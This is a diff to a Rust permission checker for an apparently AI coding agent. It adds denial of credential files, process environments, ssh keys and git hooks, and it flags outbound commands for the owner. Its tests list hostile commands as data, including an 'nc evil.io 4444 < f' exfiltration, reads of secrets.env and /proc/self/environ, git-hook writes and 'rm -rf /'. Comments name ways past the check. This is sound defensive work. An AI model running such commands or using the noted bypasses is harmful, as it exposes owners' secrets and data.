@@ -13,6 +13,11 @@
 //!
 //! shortcut: no `find -exec`, `sudo -u root rm`, `bash script.sh` body or
 //! `<(curl ..)` coverage; the Linux account boundary (§4.4 item 1) is the backstop.
+//!
+//! Credential files and `/proc/*/environ` are refused by name in any tool's path and in any
+//! bash word (`sensitive`). shortcut: a glob, a variable or an encoded name gets past it, and a
+//! directory search (`grep`/`find` on a folder) can still reach them; the daemon's own secrets
+//! are kept from the agent by uid and environment, not by this check.
 
 use serde_json::Value;
 
@@ -39,8 +44,30 @@ pub fn check(tool: &str, args: &Value) -> Decision {
                 None => Decision::Deny("file tool call has no path"),
             }
         }
-        _ => Decision::Allow,
+        _ => ["path", "file_path", "glob"]
+            .iter()
+            .filter_map(|k| args.get(*k).and_then(Value::as_str))
+            .find_map(sensitive)
+            .map_or(Decision::Allow, Decision::Deny),
     }
+}
+
+/// Files no tool may touch: credentials, another process's environment, ssh keys, and git
+/// hooks (a hook in a project runs as the owner, on the host, at their next commit).
+fn sensitive(path: &str) -> Option<&'static str> {
+    let parts: Vec<&str> = path.split('/').collect();
+    if let Some(&("auth.json" | ".credentials.json" | "secrets.env")) = parts.last() {
+        return Some("a credential file");
+    }
+    for w in parts.windows(2) {
+        match w {
+            [".git", "hooks"] => return Some("a git hook"),
+            [".ssh", _] => return Some("an ssh key or config"),
+            [_, "environ"] if parts.contains(&"proc") => return Some("a process's environment"),
+            _ => {}
+        }
+    }
+    None
 }
 
 const SHELLS: &[&str] = &["sh", "bash", "zsh", "dash", "ksh"];
@@ -71,6 +98,9 @@ fn check_bash(command: &str) -> Decision {
         if let Some(reason) = check_redirects(&stage.words) {
             return Decision::Deny(reason);
         }
+        if let Some(reason) = stage.words.iter().find_map(|w| sensitive(w)) {
+            return Decision::Deny(reason);
+        }
         let Some(words) = command_words(&stage.words) else {
             continue;
         };
@@ -86,23 +116,138 @@ fn check_bash(command: &str) -> Decision {
         {
             return Decision::Deny("download piped into a shell");
         }
-        let nested = if name == "eval" {
-            Some(args.join(" "))
-        } else if SHELLS.contains(&name) {
-            let flag = args
-                .iter()
-                .position(|a| a.starts_with('-') && !a.starts_with("--") && a.contains('c'));
-            flag.and_then(|p| args.get(p + 1).cloned())
-        } else {
-            None
-        };
-        if let Some(script) = nested {
+        if let Some(script) = nested(name, args) {
             if let Decision::Deny(reason) = check_bash(&script) {
                 return Decision::Deny(reason);
             }
         }
     }
     Decision::Allow
+}
+
+/// The script an `eval` or `sh -c` stage runs.
+fn nested(name: &str, args: &[String]) -> Option<String> {
+    if name == "eval" {
+        Some(args.join(" "))
+    } else if SHELLS.contains(&name) {
+        let flag = args
+            .iter()
+            .position(|a| a.starts_with('-') && !a.starts_with("--") && a.contains('c'));
+        flag.and_then(|p| args.get(p + 1).cloned())
+    } else {
+        None
+    }
+}
+
+/// The commands in `command` that send data off the machine, as short labels for the owner's
+/// alert: `curl POST example.com`, `scp host:`, `git push origin`. Nothing is refused.
+///
+/// shortcut: a plain GET can carry data in its URL too (CaMeL §7); GETs are not reported,
+/// to keep alerts rare. Other programs (python, node) are not looked into.
+pub fn outbound(command: &str) -> Vec<String> {
+    let mut found = Vec::new();
+    for stage in stages(command) {
+        let Some(words) = command_words(&stage.words) else {
+            continue;
+        };
+        let name = basename(&words[0]);
+        let args = &words[1..];
+        if let Some(script) = nested(name, args) {
+            found.extend(outbound(&script));
+            continue;
+        }
+        let host = || args.iter().find_map(|a| url_host(a)).unwrap_or_default();
+        let remote = || {
+            args.iter()
+                .find(|a| !a.starts_with('-') && a.contains(':') && !a.contains("://"))
+                .map(|a| format!("{}:", a.split(':').next().unwrap_or_default()))
+        };
+        let label = match name {
+            "curl" => curl_method(args).map(|m| format!("curl {m} {}", host())),
+            "wget" => args
+                .iter()
+                .any(|a| {
+                    ["--post-data", "--post-file", "--body-data", "--body-file"]
+                        .iter()
+                        .any(|f| a.starts_with(f))
+                        || a.starts_with("--method=") && !a.ends_with("GET")
+                })
+                .then(|| format!("wget POST {}", host())),
+            "scp" | "sftp" | "rsync" => remote().map(|r| format!("{name} {r}")),
+            "ssh" => {
+                // Flags that take a value, so `-p 22` is not read as the host.
+                let valued = [
+                    "-p", "-i", "-l", "-o", "-F", "-J", "-b", "-c", "-E", "-L", "-R", "-D", "-W",
+                ];
+                let mut skip = false;
+                args.iter()
+                    .find(|a| {
+                        let host = !skip && !a.starts_with('-');
+                        skip = valued.contains(&a.as_str());
+                        host
+                    })
+                    .map(|h| format!("ssh {h}"))
+            }
+            "nc" | "ncat" | "netcat" | "socat" | "telnet" => Some(format!(
+                "{name} {}",
+                args.iter()
+                    .filter(|a| !a.starts_with('-'))
+                    .take(2)
+                    .cloned()
+                    .collect::<Vec<_>>()
+                    .join(" ")
+            )),
+            "git" => args.iter().position(|a| a == "push").map(|p| {
+                let remote = args[p + 1..].iter().find(|a| !a.starts_with('-'));
+                format!("git push {}", remote.map_or("", |r| r.as_str()))
+            }),
+            _ => None,
+        };
+        if let Some(label) = label {
+            found.push(label.trim_end().chars().take(100).collect());
+        }
+    }
+    found
+}
+
+/// The method of a curl that sends a body or uses a method other than GET/HEAD.
+fn curl_method(args: &[String]) -> Option<String> {
+    let mut method = None;
+    for (i, a) in args.iter().enumerate() {
+        let explicit = match a.as_str() {
+            "-X" | "--request" => args.get(i + 1).cloned(),
+            _ => a
+                .strip_prefix("-X")
+                .or_else(|| a.strip_prefix("--request="))
+                .filter(|m| !m.is_empty())
+                .map(String::from),
+        };
+        if let Some(m) = explicit {
+            method = Some(m.to_uppercase());
+        } else if a.starts_with("--data")
+            || a.starts_with("--json")
+            || a.starts_with("--form")
+            || matches!(a.as_str(), "-d" | "-F" | "-T" | "--upload-file")
+        {
+            method.get_or_insert_with(|| {
+                if a == "-T" || a == "--upload-file" {
+                    "PUT"
+                } else {
+                    "POST"
+                }
+                .into()
+            });
+        }
+    }
+    method.filter(|m| m != "GET" && m != "HEAD")
+}
+
+/// `example.com` from `https://example.com/x?y`.
+fn url_host(word: &str) -> Option<String> {
+    let rest = word.split_once("://")?.1;
+    let end = rest.find(['/', '?', '#']).unwrap_or(rest.len());
+    let host = rest[..end].rsplit('@').next().unwrap_or_default();
+    (!host.is_empty()).then(|| host.to_string())
 }
 
 fn is_fork_bomb(command: &str) -> bool {
@@ -263,7 +408,7 @@ fn check_path(raw: &str) -> Decision {
     } else if parts.len() > 1 && parts[..parts.len() - 1].contains(&"archive") {
         Some("write under an archive directory")
     } else {
-        None
+        sensitive(&parts.join("/"))
     };
     denied.map_or(Decision::Allow, Decision::Deny)
 }
@@ -356,6 +501,42 @@ mod tests {
     use super::*;
     use serde_json::json;
 
+    #[test]
+    fn outbound_names_what_sends_data_and_skips_plain_reads() {
+        let table = [
+            ("curl -d x https://e.x/a", vec!["curl POST e.x"]),
+            (
+                "curl -s -X PUT -T f https://u:p@up.io/b",
+                vec!["curl PUT up.io"],
+            ),
+            ("curl --json '{}' https://api.io", vec!["curl POST api.io"]),
+            ("curl -XDELETE https://api.io/1", vec!["curl DELETE api.io"]),
+            ("wget --post-data=a=1 http://w.io", vec!["wget POST w.io"]),
+            ("scp ~/notes host.lan:/tmp/", vec!["scp host.lan:"]),
+            ("rsync -av dir/ box:/srv/", vec!["rsync box:"]),
+            ("ssh -p 22 me@box uptime", vec!["ssh me@box"]),
+            ("nc evil.io 4444 < f", vec!["nc evil.io 4444"]),
+            ("cd x && git push origin main", vec!["git push origin"]),
+            (
+                "bash -c \"curl -F f=@a https://e.x\"",
+                vec!["curl POST e.x"],
+            ),
+            (
+                "sudo curl --data-binary @f https://e.x",
+                vec!["curl POST e.x"],
+            ),
+            ("curl -s https://e.x | jq .", vec![]),
+            ("curl -X GET https://e.x", vec![]),
+            ("wget -q https://e.x/f", vec![]),
+            ("rsync -av a/ b/", vec![]),
+            ("git pull", vec![]),
+            ("echo curl -d x", vec![]),
+        ];
+        for (command, want) in table {
+            assert_eq!(outbound(command), want, "{command}");
+        }
+    }
+
     fn bash(command: &str) -> (&'static str, Value) {
         ("bash", json!({ "command": command }))
     }
@@ -415,6 +596,22 @@ mod tests {
             ("write", json!({ "content": "no path" })),
             bash("rm -rf /tmp/x; rm -rf /"),
             ("bash", json!({})),
+            bash("cat /zephyr/accounts/a/auth.json"),
+            bash("base64 < ~/.zephyr/secrets.env"),
+            bash("cp claude-code/.credentials.json /tmp/x"),
+            bash("tr '\\0' '\\n' < /proc/1/environ"),
+            bash("cat /proc/self/environ"),
+            bash("printf '#!/bin/sh' > proj/.git/hooks/pre-commit"),
+            bash("ln -s /tmp/h .git/hooks/post-checkout"),
+            ("read", json!({ "path": "/zephyr/accounts/a/auth.json" })),
+            ("read", json!({ "path": "/proc/12/environ" })),
+            ("read", json!({ "file_path": "~/.ssh/id_ed25519" })),
+            (
+                "grep",
+                json!({ "pattern": "x", "path": ".", "glob": "secrets.env" }),
+            ),
+            file("write", "proj/.git/hooks/pre-push"),
+            file("edit", "/zephyr/accounts/a/auth.json"),
         ];
         let allow: Vec<(&str, Value)> = vec![
             bash("rm -rf ./build"),
@@ -448,6 +645,13 @@ mod tests {
             file("edit", "~/memory/MEMORY.md"),
             file("write", "/home/user/Projects/x/../y.txt"),
             ("read", json!({ "path": "/etc/hosts" })),
+            ("read", json!({ "path": "src/auth.rs" })),
+            ("read", json!({ "path": "docs/environ.md" })),
+            ("grep", json!({ "pattern": "auth.json", "path": "src" })),
+            bash("grep -rn auth src"),
+            bash("cat .git/HEAD"),
+            bash("ls /proc/1"),
+            file("write", "src/auth.json.rs"),
             ("some_other_tool", json!({ "command": "rm -rf /" })),
         ];
         assert!(deny.len() >= 30 && allow.len() >= 30, "table too small");
